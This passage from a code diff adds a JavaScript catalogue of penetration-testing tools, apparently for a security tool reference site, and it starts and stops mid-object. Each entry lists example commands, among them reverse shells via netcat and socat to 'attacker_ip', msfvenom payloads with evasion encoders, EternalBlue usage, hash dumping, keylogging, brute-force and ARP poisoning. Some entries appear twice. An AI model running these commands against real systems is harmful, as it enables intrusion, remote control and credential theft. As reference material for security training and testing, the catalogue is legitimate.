+          "RDP attack:\n  ncrack -U usernames.txt -P passwords.txt rdp://192.168.1.1",
+          "FTP brute force:\n  ncrack -U usernames.txt -P passwords.txt ftp://192.168.1.1",
+          "HTTP authentication attack:\n  ncrack -U usernames.txt -P passwords.txt http://192.168.1.1",
+          "Specify ports manually:\n  ncrack -p 22,3389 192.168.1.1",
+        ],
+        parameters: [
+          { param: "-U", description: "File with usernames" },
+          { param: "-P", description: "File with passwords" },
+          {
+            param: "-p",
+            description: "Port specification (single or multiple)",
+          },
+          {
+            param: "--connection-limit",
+            description: "Set max concurrent connections per host",
+          },
+          { param: "-g", description: "Set TCP source port number" },
+        ],
+      },
+      Empire: {
+        name: "Empire",
+        command: "./empire",
+        description:
+          "Empire is a post-exploitation framework that uses PowerShell agents and Python3 for flexible operations across platforms. It's widely used by red teams and pentesters for command-and-control, persistence, and lateral movement.",
+        category: "Command and Control",
+        version: "3.6",
+        docs: "https://github.com/BC-SECURITY/Empire",
+        image: "../assets/img/empire.png",
+        usage:
+          "Empire supports the use of agents to execute post-exploitation tasks on compromised machines. It includes a modular structure for launching attacks, maintaining access, escalating privileges, and more. It’s often used in simulated attack scenarios and red teaming.",
+        examples: [
+          "Launch Empire:\n  ./empire",
+          "List available listeners:\n  listeners",
+          "Create a listener:\n  uselistener http",
+          "Generate agent stager:\n  usestager windows/launcher_bat\n  set Listener http\n  execute",
+          "Interact with agent:\n  agents\n  interact AGENT_NAME",
+        ],
+        parameters: [
+          {
+            param: "usestager",
+            description: "Select stager type to generate an agent",
+          },
+          {
+            param: "set Listener",
+            description: "Define the listener the agent should connect to",
+          },
+          { param: "execute", description: "Execute the selected stager" },
+          { param: "agents", description: "List all active agents" },
+          {
+            param: "interact",
+            description: "Interact with a specific agent session",
+          },
+        ],
+      },
+      Msfvenom: {
+        name: "Msfvenom",
+        command:
+          "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > shell.exe",
+        description:
+          "Msfvenom is a powerful payload generator and encoder tool that is part of the Metasploit Framework. It allows users to create payloads for various platforms and encode them to bypass security mechanisms.",
+        category: "Payload Generation",
+        version: "6.0",
+        docs: "https://docs.metasploit.com/docs/using-metasploit/msfvenom.html",
+        image: "../assets/img/msfvenom.png",
+        usage:
+          "Msfvenom is used to generate payloads for exploitation, which can be executed on a target system to gain remote access or run arbitrary commands. It supports various output formats such as exe, elf, apk, and more.",
+        examples: [
+          "Generate Windows reverse shell executable:\n  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > shell.exe",
+          "Create Python payload:\n  msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw > shell.py",
+          "List all payloads:\n  msfvenom -l payloads",
+          "Encode payload with shikata_ga_nai:\n  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -f exe > shell.exe",
+          'Specify bad characters:\n  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -b "\\x00\\x0a" -f exe > shell.exe',
+        ],
+        parameters: [
+          {
+            param: "-p",
+            description:
+              "Specify the payload type (e.g., windows/meterpreter/reverse_tcp)",
+          },
+          {
+            param: "LHOST",
+            description: "Local host IP for the reverse connection",
+          },
+          { param: "LPORT", description: "Local port to connect back to" },
+          {
+            param: "-f",
+            description: "Output format (e.g., exe, elf, raw, python)",
+          },
+          {
+            param: "-e",
+            description: "Encoder to use for payload obfuscation",
+          },
+          {
+            param: "-b",
+            description: "Specify bad characters to avoid in the payload",
+          },
+        ],
+      },
+      ettercap: {
+        name: "Ettercap",
+        command: "ettercap -T -M arp:remote /192.168.1.1/ /192.168.1.2/",
+        description:
+          "Ettercap is a comprehensive suite for man-in-the-middle attacks on LAN. It features sniffing of live connections, content filtering, and many other interesting tricks.",
+        category: "Man-in-the-Middle (MitM)",
+        version: "0.8.3",
+        docs: "https://www.ettercap-project.org/",
+        image: "../assets/img/ettercap.png",
+        usage:
+          "Ettercap allows you to intercept, analyze, and manipulate network traffic. It supports active and passive dissection of many protocols and includes features for ARP poisoning, DNS spoofing, and credential capture.",
+        examples: [
+          "Basic ARP poisoning MitM:\n  ettercap -T -M arp:remote /192.168.1.1/ /192.168.1.2/",
+          "Launch GUI mode:\n  ettercap -G",
+          "Sniff all traffic in a subnet:\n  ettercap -T -q -i eth0",
+          "DNS spoofing with plugin:\n  ettercap -T -M arp:remote -P dns_spoof /target_ip/ /gateway_ip/",
+          "List available plugins:\n  ettercap -P list",
+        ],
+        parameters: [
+          { param: "-T", description: "Text-only mode (no GUI)" },
+          { param: "-G", description: "Launch in GTK graphical mode" },
+          {
+            param: "-M",
+            description: "Man-in-the-middle attack mode (e.g., arp:remote)",
+          },
+          { param: "-i", description: "Specify network interface" },
+          {
+            param: "-P",
+            description: "Load specific plugin (e.g., dns_spoof)",
+          },
+          {
+            param: "/target/",
+            description: "Specify target IP or MAC in slashes for attack",
+          },
+        ],
+      },
+      nmap: {
+        name: "Nmap",
+        command: "nmap -sS -T4 -A -v 192.168.1.1",
+        description: "Network exploration tool and security/port scanner",
+        category: "Network Scanning",
+        version: "7.93",
+        docs: "https://nmap.org/book/man.html",
+        image: "../assets/img/nmap.png",
+        usage:
+          "Nmap (Network Mapper) is a free and open-source utility for network discovery and security auditing. It uses raw IP packets to determine what hosts are available on the network, what services those hosts are offering, what operating systems they are running, and other characteristics.",
+        examples: [
+          "Basic TCP SYN scan:\n  nmap -sS 192.168.1.1",
+          "Comprehensive scan:\n  nmap -sS -sV -sC -O -T4 -A -v 192.168.1.1",
+          "Scan specific ports:\n  nmap -p 80,443,8080 192.168.1.1",
+          "Scan all ports:\n  nmap -p- 192.168.1.1",
+        ],
+        parameters: [
+          { param: "-sS", description: "TCP SYN scan (stealth scan)" },
+          {
+            param: "-sV",
+            description: "Probe open ports to determine service/version info",
+          },
+          { param: "-O", description: "Enable OS detection" },
+          {
+            param: "-A",
+            description:
+              "Enable OS detection, version detection, script scanning, and traceroute",
+          },
+          { param: "-T4", description: "Aggressive timing template" },
+        ],
+      },
+      metasploit: {
+        name: "Metasploit Framework",
+        command: "msfconsole",
+        description:
+          "Metasploit Framework is an advanced, open-source platform for developing, testing, and executing exploits against remote targets. It supports hundreds of exploits, payloads, and post-exploitation modules.",
+        category: "Exploitation Framework",
+        version: "6.3.4",
+        docs: "https://docs.metasploit.com/",
+        image: "../assets/img/metasploit.png",
+        usage:
+          "Metasploit is used by penetration testers and red teams to simulate attacks and test system defenses. It includes msfconsole (CLI), msfvenom (payload generator), and various modules for reconnaissance, exploitation, and privilege escalation.",
+        examples: [
+          "Start Metasploit console:\n  msfconsole",
+          "Search for exploit:\n  search type:exploit platform:windows",
+          "Use a module:\n  use exploit/windows/smb/ms17_010_eternalblue",
+          "Set target options:\n  set RHOSTS 192.168.1.100\n  set LHOST 192.168.1.10\n  set LPORT 4444",
+          "Run the exploit:\n  exploit",
+        ],
+        parameters: [
+          {
+            param: "msfconsole",
+            description: "Launch Metasploit command-line interface",
+          },
+          {
+            param: "search",
+            description: "Search for available modules by keyword/type",
+          },
+          {
+            param: "use",
+            description: "Select a module to configure and launch",
+          },
+          {
+            param: "set",
+            description: "Set options such as RHOSTS, LHOST, LPORT, etc.",
+          },
+          {
+            param: "exploit",
+            description: "Execute the selected exploit module",
+          },
+        ],
+      },
+      Netcat: {
+        name: "Netcat",
+        command: "nc -lvp 4444",
+        description:
+          "Netcat (often abbreviated as nc) is a versatile networking tool that reads and writes data across network connections using the TCP or UDP protocols. It is widely used for troubleshooting, scanning, and creating backdoor shells.",
+        category: "Networking / Shells",
+        version: "1.10",
+        docs: "https://nc110.sourceforge.io/",
+        image: "../assets/img/netcat.png",
+        usage:
+          "Netcat can be used to open TCP connections, listen on ports, perform port scans, transfer files, and set up reverse or bind shells. It is a staple tool in penetration testing and system administration.",
+        examples: [
+          "Start a listener on port 4444:\n  nc -lvp 4444",
+          "Connect to a remote host on port 4444:\n  nc 192.168.1.1 4444",
+          "Send a file to a remote machine:\n  nc 192.168.1.1 1234 < file.txt",
+          "Receive a file:\n  nc -lvp 1234 > file.txt",
+          "Create a reverse shell:\n  nc -e /bin/bash 192.168.1.1 4444",
+          "Port scanning a target:\n  nc -zv 192.168.1.1 20-80",
+        ],
+        parameters: [
+          { param: "-l", description: "Listen mode, for inbound connects" },
+          { param: "-v", description: "Verbose output" },
+          { param: "-p", description: "Local port number to use" },
+          { param: "-e", description: "Execute program after connection" },
+          { param: "-z", description: "Zero-I/O mode [used for scanning]" },
+          {
+            param: "-w",
+            description: "Timeout for connects and final net reads",
+          },
+        ],
+      },
+      Meterpreter: {
+        name: "Meterpreter",
+        command: "sessions -i 1",
+        description:
+          "Meterpreter is a powerful and extensible payload that provides an interactive shell from within the Metasploit Framework. It allows attackers to control compromised systems without creating new processes or files on disk.",
+        category: "Post Exploitation",
+        version: "Integrated with Metasploit",
+        docs: "https://docs.rapid7.com/metasploit/meterpreter-basics/",
+        image: "../assets/img/meterpreter.png",
+        usage:
+          "Meterpreter is commonly used after a successful exploit. It provides features such as file system access, webcam capture, keylogging, command execution, and pivoting—all while staying memory-resident and stealthy.",
+        examples: [
+          "List active sessions:\n  sessions",
+          "Interact with a session:\n  sessions -i 1",
+          "Upload a file:\n  upload /path/to/file",
+          "Download a file:\n  download /path/to/file",
+          "Capture a screenshot:\n  screenshot",
+          "Enable keylogger:\n  keyscan_start",
+          "Dump password hashes:\n  hashdump",
+        ],
+        parameters: [
+          {
+            param: "sessions",
+            description: "List active Meterpreter sessions",
+          },
+          {
+            param: "sessions -i <id>",
+            description: "Interact with a specific session",
+          },
+          {
+            param: "upload",
+            description: "Upload a file to the target system",
+          },
+          {
+            param: "download",
+            description: "Download a file from the target system",
+          },
+          {
+            param: "screenshot",
+            description: "Capture the screen of the target machine",
+          },
+          { param: "hashdump", description: "Dump SAM database hashes" },
+          {
+            param: "keyscan_start",
+            description: "Start capturing keystrokes",
+          },
+          {
+            param: "keyscan_dump",
+            description: "Display captured keystrokes",
+          },
+        ],
+      },
+      hydra: {
+        name: "Hydra",
+        command: "hydra -l admin -P passwords.txt ssh://192.168.1.1",
+        description:
+          "A fast and flexible network login cracker that supports many protocols.",
+        category: "Password Cracking",
+        version: "9.3",
+        docs: "https://github.com/vanhauser-thc/thc-hydra",
+        image: "../assets/img/hydra.png",
+        usage:
+          "Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add. This tool makes it possible for researchers and security consultants to show how easy it would be to gain unauthorized access to a system remotely.",
+        examples: [
+          "SSH brute force:\n  hydra -l admin -P passwords.txt ssh://192.168.1.1",
+          'HTTP form attack:\n  hydra -l admin -P passwords.txt 192.168.1.1 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"',
+          "FTP attack with username list:\n  hydra -L usernames.txt -P passwords.txt ftp://192.168.1.1",
+          "RDP attack with specific port:\n  hydra -t 4 -V -f -l administrator -P passwords.txt rdp://192.168.1.1:3389",
+        ],
+        parameters: [
+          { param: "-l", description: "Single username to test" },
+          { param: "-L", description: "Username list file" },
+          { param: "-p", description: "Single password to test" },
+          { param: "-P", description: "Password list file" },
+          {
+            param: "-t",
+            description: "Number of parallel tasks (default: 16)",
+          },
+        ],
+      },
+      john: {
+        name: "John the Ripper",
+        command: "john --wordlist=passwords.txt --format=NT hashes.txt",
+        description:
+          "A fast password cracker, currently available for many flavors of Unix, Windows, DOS, and OpenVMS.",
+        category: "Password Cracking",
+        version: "1.9.0",
+        docs: "https://www.openwall.com/john/doc/",
+        image: "../assets/img/john.png",
+        usage:
+          "John the Ripper is a fast password cracker, currently available for many flavors of Unix, Windows, DOS, BeOS, and OpenVMS. Its primary purpose is to detect weak Unix passwords. Besides several crypt(3) password hash types most commonly found on various Unix systems, supported out of the box are Windows LM hashes, various macOS password hashes, as well as database and document formats.",
+        examples: [
+          "Dictionary attack:\n  john --wordlist=passwords.txt hashes.txt",
+          "Brute force attack:\n  john --incremental hashes.txt",
+          "Show cracked passwords:\n  john --show hashes.txt",
+          "Crack Windows hashes:\n  john --format=NT hashes.txt",
+          "Crack with rules:\n  john --wordlist=passwords.txt --rules hashes.txt",
+        ],
+        parameters: [
+          {
+            param: "--wordlist",
+            description: "Wordlist file for dictionary attack",
+          },
+          {
+            param: "--format",
+            description: "Hash format (NT, md5crypt, etc.)",
+          },
+          { param: "--incremental", description: "Brute force mode" },
+          { param: "--rules", description: "Enable word mangling rules" },
+          { param: "--show", description: "Show cracked passwords" },
+        ],
+      },
+      armitage: {
+        name: "Armitage",
+        command: "armitage",
+        description:
+          "Armitage is a graphical cyber attack management tool for the Metasploit Framework. It visualizes targets and recommends exploits, making it easier for teams to coordinate attacks.",
+        category: "GUI / Metasploit",
+        version: "2020.11.05",
+        docs: "https://github.com/rsmudge/armitage",
+        image: "../assets/img/armitage.png",
+        usage:
+          "Armitage provides a point-and-click interface for Metasploit. It supports host discovery, vulnerability scanning, exploit execution, and session management with a built-in collaboration server for red team operations.",
+        examples: [
+          "Start PostgreSQL:\n  sudo systemctl start postgresql",
+          "Initialize Metasploit database:\n  msfdb init",
+          "Launch Armitage:\n  armitage",
+          "Connect to Metasploit RPC server:\n  enter credentials in the GUI and connect",
+          "Scan and exploit target:\n  Use GUI to find and attack targets",
+        ],
+        parameters: [
+          {
+            param: "armitage",
+            description: "Launch the Armitage GUI application",
+          },
+          {
+            param: "msfdb init",
+            description: "Initialize the Metasploit database",
+          },
+          {
+            param: "systemctl start postgresql",
+            description:
+              "Start the PostgreSQL service required by Metasploit",
+          },
+        ],
+      },
+      beef: {
+        name: "BeEF",
+        command: "beef-xss",
+        description:
+          "The Browser Exploitation Framework that focuses on the web browser as an attack vector.",
+        category: "Web Exploitation",
+        version: "0.5.0.0",
+        docs: "https://beefproject.com/",
+        image: "../assets/img/beef.png",
+        usage:
+          "The Browser Exploitation Framework (BeEF) is a powerful professional security tool. BeEF is pioneering techniques that provide the experienced penetration tester with practical client-side attack vectors. Unlike other security frameworks, BeEF focuses on leveraging browser vulnerabilities to assess the security posture of a target.",
+        examples: [
+          "Start BeEF:\n  beef-xss",
+          "Start with custom config:\n  beef-xss -c /path/to/config.yaml",
+          "Run with debug output:\n  beef-xss -x",
+          "Specify listening interface:\n  beef-xss -b 192.168.1.1",
+        ],
+        parameters: [
+          { param: "-c", description: "Specify configuration file" },
+          { param: "-x", description: "Enable debug output" },
+          { param: "-b", description: "Bind to specific IP address" },
+          { param: "-p", description: "Specify port number" },
+          { param: "-h", description: "Show help message" },
+        ],
+      },
+      routersploit: {
+        name: "RouterSploit",
+        command: "python3 rsf.py",
+        description:
+          "RouterSploit is an open-source exploitation framework focused on embedded devices like routers, IoT devices, and webcams. It provides exploits, scanners, and payloads for testing device security.",
+        category: "IoT/Router Exploitation",
+        version: "3.4.1",
+        docs: "https://github.com/threat9/routersploit",
+        image: "../assets/img/routersploit.png",
+        usage:
+          "RouterSploit is used to scan and exploit vulnerabilities in embedded devices. It includes modules for exploiting routers, credential brute-forcing, and firmware backdoor detection.",
+        examples: [
+          "Launch framework:\n  python3 rsf.py",
+          "List available modules:\n  show modules",
+          "Use an exploit module:\n  use exploits/routers/dlink/dsl2750b_auth_bypass",
+          "Set target IP:\n  set target 192.168.1.1",
+          "Run the module:\n  run",
+        ],
+        parameters: [
+          {
+            param: "use",
+            description:
+              "Select a module to run (e.g., use scanners/autopwn)",
+          },
+          {
+            param: "set target",
+            description: "Specify the IP address of the target device",
+          },
+          { param: "run", description: "Execute the selected module" },
+          {
+            param: "show modules",
+            description: "List all available exploit and scanner modules",
+          },
+          {
+            param: "show options",
+            description:
+              "Display configurable options for the selected module",
+          },
+        ],
+      },
+      aircrack: {
+        name: "Aircrack-ng",
+        command: "aircrack-ng capture.cap -w wordlist.txt",
+        description:
+          "Aircrack-ng is a suite of tools used to assess Wi-Fi network security. It focuses on different areas of Wi-Fi security such as monitoring, attacking, testing, and cracking.",
+        category: "Wireless Cracking",
+        version: "1.7",
+        docs: "https://www.aircrack-ng.org/",
+        image: "../assets/img/aircrack-ng.png",
+        usage:
+          "Aircrack-ng is used to capture and analyze Wi-Fi traffic, and to crack WEP and WPA/WPA2-PSK keys. It supports packet injection, fake authentication, deauthentication attacks, and dictionary attacks.",
+        examples: [
+          "Start monitoring interface:\n  airmon-ng start wlan0",
+          "Capture traffic:\n  airodump-ng wlan0mon",
+          "Target a specific network:\n  airodump-ng --bssid <AP_MAC> -c <channel> -w capture wlan0mon",
+          "Crack captured WPA handshake:\n  aircrack-ng capture.cap -w wordlist.txt",
+          "Deauthenticate a client:\n  aireplay-ng --deauth 10 -a <AP_MAC> -c <Client_MAC> wlan0mon",
+        ],
+        parameters: [
+          {
+            param: "airmon-ng",
+            description: "Enable monitor mode on wireless interfaces",
+          },
+          {
+            param: "airodump-ng",
+            description: "Capture 802.11 frames from wireless networks",
+          },
+          {
+            param: "aireplay-ng",
+            description:
+              "Inject packets for deauthentication, fake auth, etc.",
+          },
+          {
+            param: "aircrack-ng",
+            description: "Crack WEP/WPA keys from captured traffic",
+          },
+          { param: "-w", description: "Specify the path to the wordlist" },
+          {
+            param: "-b",
+            description: "Specify the BSSID (MAC address of AP)",
+          },
+        ],
+      },
+      sqlmap: {
+        name: "SQLMap",
+        command: 'sqlmap -u "http://target.com/page.php?id=1" --batch --dbs',
+        description:
+          "SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection vulnerabilities in database-driven web applications.",
+        category: "Database Exploitation",
+        version: "1.7.9.16",
+        docs: "https://sqlmap.org/",
+        image: "../assets/img/sqlmap.png",
+        usage:
+          "SQLMap allows security professionals to detect and exploit SQL injection vulnerabilities. It supports database fingerprinting, data fetching, file system access, and even command execution on the database host.",
+        examples: [
+          'Basic SQL injection test:\n  sqlmap -u "http://target.com/page.php?id=1" --batch',
+          'List available databases:\n  sqlmap -u "http://target.com/page.php?id=1" --dbs',
+          'Dump a specific database:\n  sqlmap -u "http://target.com/page.php?id=1" -D dbname --tables',
+          'Retrieve data from a table:\n  sqlmap -u "http://target.com/page.php?id=1" -D dbname -T tablename --dump',
+          'Test POST request:\n  sqlmap -u "http://target.com/page.php" --data="id=1" --batch',
+        ],
+        parameters: [
+          { param: "-u", description: "Target URL (with injection point)" },
+          { param: "--dbs", description: "Enumerate available databases" },
+          { param: "-D", description: "Specify database name" },
+          { param: "-T", description: "Specify table name" },
+          { param: "--dump", description: "Dump table entries" },
+          {
+            param: "--batch",
+            description: "Run in non-interactive mode (auto confirm prompts)",
+          },
+          {
+            param: "--data",
+            description: "Send parameters via POST instead of GET",
+          },
+        ],
+      },
+      socat: {
+        name: "Socat",
+        command: "socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash",
+        description:
+          "Socat (SOcket CAT) is a command line based utility that establishes two bidirectional byte streams and transfers data between them. It's commonly used for port forwarding, relays, proxies, and reverse shells.",
+        category: "Networking / Shells",
+        version: "1.7.4.4",
+        docs: "http://www.dest-unreach.org/socat/",
+        image: "../assets/img/socat.png",
+        usage:
+          "Socat is used in penetration testing to set up encrypted tunnels, reverse shells, and data relays between local and remote hosts. It's highly configurable and can connect different kinds of data streams such as TCP, UDP, files, and TTYs.",
+        examples: [
+          "Start reverse shell listener:\n  socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash",
+          "Connect back to attacker (reverse shell):\n  socat TCP:attacker_ip:4444 EXEC:/bin/bash",
+          "Create an encrypted reverse shell with OpenSSL:\n  socat OPENSSL:attacker_ip:4444 EXEC:/bin/bash,verify=0",
+          "Forward local port to remote:\n  socat TCP-LISTEN:8080,fork TCP:remote_ip:80",
+          "Bind shell listener:\n  socat TCP-LISTEN:9999,fork EXEC:/bin/sh",
+        ],
+        parameters: [
+          {
+            param: "TCP-LISTEN:<port>",
+            description:
+              "Listen for incoming TCP connections on specified port",
+          },
+          {
+            param: "TCP:<host>:<port>",
+            description: "Connect to remote host on given port",
+          },
+          {
+            param: "EXEC:/bin/bash",
+            description: "Execute shell when connection is made",
+          },
+          {
+            param: "reuseaddr",
+            description: "Allow socket reuse without waiting",
+          },
+          {
+            param: "fork",
+            description: "Fork a new process for each connection",
+          },
+          {
+            param: "OPENSSL",
+            description: "Enable encrypted connection using OpenSSL",
+          },
+        ],
+      },
+      cobaltstrike: {
+        name: "Cobalt Strike",
+        command: "./teamserver <your_ip> <password>",
+        description:
+          "Cobalt Strike is a commercial adversary simulation tool designed for red team operations and advanced post-exploitation. It provides a powerful GUI interface for managing beacons, lateral movement, persistence, and data exfiltration.",
+        category: "Command and Control",
+        version: "4.8",
+        docs: "https://www.cobaltstrike.com/help-index",
+        image: "../assets/img/cobaltstrike.png",
+        usage:
+          "Cobalt Strike is used by red teams to emulate advanced persistent threats (APTs). It offers features like customizable malware (beacons), post-exploitation modules, collaborative operations, and detailed reporting capabilities.",
+        examples: [
+          "Start the Cobalt Strike team server:\n  ./teamserver <your_ip> <password>",
+          "Launch the Cobalt Strike client:\n  ./cobaltstrike",
+          "Generate a beacon payload:\n  Use GUI → Attacks → Packages → Payload Generator",
+          "Deploy beacon via exploit or phishing:\n  Use delivery method to get beacon running on target",
+          "Interact with sessions:\n  Use GUI to browse beacons, run commands, and pivot",
+        ],
+        parameters: [
+          {
+            param: "teamserver",
+            description:
+              "Start the server for Cobalt Strike with IP and password",
+          },
+          {
+            param: "cobaltstrike",
+            description: "Launch the Cobalt Strike client GUI",
+          },
+          {
+            param: "beacon",
+            description:
+              "Customizable implant for communication and post-exploitation",
+          },
+          {
+            param: "Aggressor Scripts",
+            description: "Automation and scripting support for operations",
+          },
+          {
+            param: "GUI interface",
+            description:
+              "Point-and-click access to post-exploitation and lateral movement features",
+          },
+        ],
+      },
+      empire: {
+        name: "Empire",
+        command: "./empire",
+        description:
+          "Empire is a post-exploitation and adversary emulation framework that uses PowerShell and Python agents. It's designed for red teaming, with a focus on stealth, flexibility, and cross-platform support.",
+        category: "Command and Control",
+        version: "3.6",
+        docs: "https://github.com/BC-SECURITY/Empire",
+        image: "../assets/img/empire.png",
+        usage:
+          "Empire allows operators to maintain control over compromised systems through agents, execute post-exploitation tasks, harvest credentials, and perform lateral movement. It is used in simulated attack scenarios to mimic real-world adversaries.",
+        examples: [
+          "Launch Empire:\n  ./empire",
+          "Use listener module:\n  uselistener http",
+          "Set options:\n  set Name http_listener\n  set Host http://192.168.1.10",
+          "Execute listener:\n  execute",
+          "Use stager module:\n  usestager windows/launcher_bat",
+          "Generate payload:\n  set Listener http_listener\n  execute",
+          "Interact with agent:\n  agents\n  interact AGENT_NAME",
+        ],
+        parameters: [
+          {
+            param: "uselistener",
+            description: "Use a listener module to receive agent connections",
+          },
+          {
+            param: "usestager",
+            description: "Choose a stager to generate the payload",
+          },
+          { param: "agents", description: "List active agents" },
+          {
+            param: "interact",
+            description: "Interact with an active agent session",
+          },
+          {
+            param: "execute",
+            description: "Run the configured module (listener, stager, etc.)",
+          },
+        ],
+      },
+      pupy: {
+        name: "Pupy",
+        command: "./pupysh.py",
+        description:
+          "Pupy is an open-source, cross-platform (Windows, Linux, macOS, Android) remote administration and post-exploitation tool. It supports various transport methods, credential dumping, keylogging, and more.",
+        category: "Remote Administration / Post Exploitation",
+        version: "1.7-dev",
+        docs: "https://github.com/n1nj4sec/pupy",
+        image: "../assets/img/pupy.png",
+        usage:
+          "Pupy enables remote control of systems using encrypted communications over different protocols (HTTP, DNS, SMB, etc.). It is designed for stealthy post-exploitation with in-memory payload delivery and scriptless execution techniques.",
+        examples: [
+          "Start Pupy server:\n  ./pupysh.py",
+          "List connected sessions:\n  sessions",
+          "Interact with a session:\n  interact <session_id>",
+          "Dump credentials:\n  creds",
+          "Run keylogger:\n  keylogger start",
+          "Upload a file:\n  upload /local/path /remote/path",
+          "Use SMB transport:\n  ./pupygen.py -t exe_x86 -O pupy.exe -p 443 -T smb",
+        ],
+        parameters: [
+          {
+            param: "./pupysh.py",
+            description: "Start the Pupy interactive shell",
+          },
+          { param: "sessions", description: "List active agent sessions" },
+          {
+            param: "interact",
+            description: "Interact with a specific session",
+          },
+          {
+            param: "creds",
+            description: "Dump stored credentials from the host",
+          },
+          {
+            param: "keylogger start",
+            description: "Start capturing keystrokes on target",
+          },
+          { param: "upload", description: "Upload files to remote target" },
+          {
+            param: "pupygen.py",
+            description: "Generate payload using specified options",
+          },
+        ],
+      },
+      nmap: {
+        name: "Nmap",
+        command: "nmap -sS -T4 -A -v 192.168.1.1",
+        description: "Network exploration tool and security/port scanner",
+        category: "Network Scanning",
+        version: "7.93",
+        docs: "https://nmap.org/book/man.html",
+        image: "../assets/img/nmap.png",
+        usage:
+          "Nmap (Network Mapper) is a free and open-source utility for network discovery and security auditing. It uses raw IP packets to determine what hosts are available on the network, what services those hosts are offering, what operating systems they are running, and other characteristics.",
+        examples: [
+          "Basic TCP SYN scan:\n  nmap -sS 192.168.1.1",
+          "Comprehensive scan:\n  nmap -sS -sV -sC -O -T4 -A -v 192.168.1.1",
+          "Scan specific ports:\n  nmap -p 80,443,8080 192.168.1.1",
+          "Scan all ports:\n  nmap -p- 192.168.1.1",
+        ],
+        parameters: [
+          { param: "-sS", description: "TCP SYN scan (stealth scan)" },
+          {
+            param: "-sV",
+            description: "Probe open ports to determine service/version info",
+          },
+          { param: "-O", description: "Enable OS detection" },
+          {
+            param: "-A",
+            description:
+              "Enable OS detection, version detection, script scanning, and traceroute",
+          },
+          { param: "-T4", description: "Aggressive timing template" },
+        ],
+      },
+      nessus: {
+        name: "Nessus",
+        command: "nessus",
+        description:
+          "A powerful vulnerability assessment tool used to identify security issues, misconfigurations, and weaknesses in networks and systems.",
+        category: "Vulnerability Scanning",
+        version: "10.5.0",
+        docs: "https://docs.tenable.com/nessus/Content/GettingStarted.htm",
+        image: "../assets/img/nessus.png",
+        usage:
+          "Nessus is a widely used vulnerability scanner developed by Tenable. It detects vulnerabilities, missing patches, and configuration issues across systems, services, and networks. It features both a GUI (web interface) and command-line support.",
+        examples: [
+          "Access Nessus Web UI:\n  https://localhost:8834",
+          "Basic network scan:\n  nessus --scan 192.168.1.0/24",
+          'Scan with specific policy:\n  nessus --scan 10.0.0.1 --policy "Basic Network Scan"',
+          "Export scan results:\n  nessus --export scan_id --format html",
+        ],
+        parameters: [
+          {
+            param: "--scan",
+            description: "Specify target IP or range to scan",
+          },
+          { param: "--policy", description: "Use a specific scan policy" },
+          { param: "--export", description: "Export scan results" },
+          {
+            param: "--format",
+            description: "Output format (html, csv, pdf)",
+          },
+          {
+            param: "--credentials",
+            description: "Provide credentials for authenticated scans",
+          },
+        ],
+      },
+      openvas: {
+        name: "OpenVAS",
+        command: "gvm-start",
+        description:
+          "An open-source vulnerability scanning framework for detecting security issues, misconfigurations, and known vulnerabilities in networked systems.",
+        category: "Vulnerability Scanning",
+        version: "21.4.0",
+        docs: "https://www.greenbone.net/en/documentation/",
+        image: "../assets/img/openvas.png",
+        usage:
+          "OpenVAS (Open Vulnerability Assessment System) is a full-featured open-source vulnerability scanner that is part of the Greenbone Vulnerability Management (GVM) framework. It helps detect vulnerabilities, misconfigurations, and missing updates on systems.",
+        examples: [
+          "Start OpenVAS services:\n  sudo gvm-start",
+          "Access web interface:\n  https://localhost:9392",
+          'Create new scan task:\n  gvm-cli --create-task "Network Scan" --target 192.168.1.0/24',
+          "Export scan results:\n  gvm-cli --get-report scan_id --format pdf",
+        ],
+        parameters: [
+          { param: "--create-task", description: "Create a new scan task" },
+          { param: "--target", description: "Specify target IP or range" },
+          {
+            param: "--scan-config",
+            description: "Use specific scan configuration",
+          },
+          { param: "--get-report", description: "Retrieve scan report" },
+          { param: "--format", description: "Report output format" },
+        ],
+      },
+      nikto: {
+        name: "Nikto",
+        command: "nikto -h http://example.com",
+        description:
+          "A web server vulnerability scanner that performs comprehensive tests for dangerous files, outdated server software, and other security issues.",
+        category: "Web Scanning",
+        version: "2.1.6",
+        docs: "https://cirt.net/Nikto2-Documentation",
+        image: "../assets/img/nikto.png",
+        usage:
+          "Nikto is an open-source web server scanner that detects over 6,700 potentially dangerous files or programs, checks for outdated versions, and scans server configurations for security issues.",
+        examples: [
+          "Basic web server scan:\n  nikto -h http://example.com",
+          "Scan with SSL:\n  nikto -h https://example.com -ssl",
+          "Scan specific port:\n  nikto -h example.com -p 8080",
+          "Save output to file:\n  nikto -h example.com -o results.html -Format html",
+        ],
+        parameters: [
+          { param: "-h", description: "Target host to scan" },
+          { param: "-p", description: "Port number to scan" },
+          { param: "-ssl", description: "Force SSL mode" },
+          { param: "-o", description: "Output file for results" },
+          {
+            param: "-Format",
+            description: "Output format (csv, txt, html, xml)",
+          },
+        ],
+      },
+      masscan: {
+        name: "Masscan",
+        command: "masscan -p1-65535 192.168.1.0/24 --rate=1000",
+        description:
+          "An ultra-fast TCP port scanner capable of scanning the entire Internet in minutes. Ideal for high-speed reconnaissance.",
+        category: "Port Scanning",
+        version: "1.3.2",
+        docs: "https://github.com/robertdavidgraham/masscan",
+        image: "../assets/img/masscan.png",
+        usage:
+          "Masscan is the fastest Internet port scanner. It can scan the entire IPv4 address space in under 10 minutes, depending on your bandwidth. It's best suited for large-scale reconnaissance.",
+        examples: [
+          "Scan all ports on a subnet:\n  masscan -p1-65535 192.168.1.0/24",
+          "Scan specific ports:\n  masscan -p80,443 10.0.0.0/8",
+          "Limit scan rate:\n  masscan -p22 --rate=10000 192.168.0.0/16",
+          "Save results to file:\n  masscan -p80 192.168.0.0/24 -oG output.txt",
+        ],
+        parameters: [
+          {
+            param: "-p",
+            description: "Ports to scan (single, range, or list)",
+          },
+          { param: "--rate", description: "Packets per second to send" },
